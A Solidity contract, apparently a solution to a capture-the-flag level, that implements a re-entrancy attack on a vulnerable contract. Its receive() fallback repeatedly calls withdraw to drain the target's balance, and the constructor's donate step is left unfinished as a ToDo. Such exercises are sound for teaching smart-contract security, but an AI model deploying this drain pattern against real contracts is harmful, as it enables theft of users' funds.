// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import "./10-re-entrancy.sol";
import "interfaces/ire-entrancy.sol";

contract Attack10 {
    ReentrantInterface reentrance;
    address payable public owner;
    uint public amount;

    constructor(address _reEntrancyAddress, uint _amount) public {
        reentrance = ReentrantInterface(_reEntrancyAddress);
        owner = msg.sender;
        amount = _amount;

        // call the donate() function, on the target contract
        // # ToDo
    }

    function attack() public {
        reentrance.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrance).balance > amount) {
            reentrance.withdraw(amount);
        }
    }
}
